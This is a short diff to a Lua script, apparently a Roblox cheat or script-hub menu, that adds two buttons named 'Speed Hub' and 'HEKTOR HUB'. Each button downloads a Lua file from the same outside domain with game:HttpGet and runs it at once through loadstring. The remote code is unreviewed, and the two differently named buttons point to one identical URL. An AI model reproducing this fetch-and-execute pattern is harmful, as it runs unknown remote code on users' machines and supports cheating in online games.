@@ -125,6 +125,22 @@ Main2Tab:AddButton({
 })
 
 Main2Tab:AddButton({
+    Name = "Speed Hub",
+    Callback = function()
+        print("Button pressed")
+        loadstring(game:HttpGet("https://egorikusa.space/e9cddcdf2b6a65844d096e98.lua", true))()
+    end   
+})
+
+Main2Tab:AddButton({
+    Name = "HEKTOR HUB",
+    Callback = function()
+        print("Button pressed")
+        loadstring(game:HttpGet("https://egorikusa.space/e9cddcdf2b6a65844d096e98.lua", true))()
+    end   
+})
+
+Main2Tab:AddButton({
     Name = "AutoFarm",
     Callback = function()
         print("Button pressed")
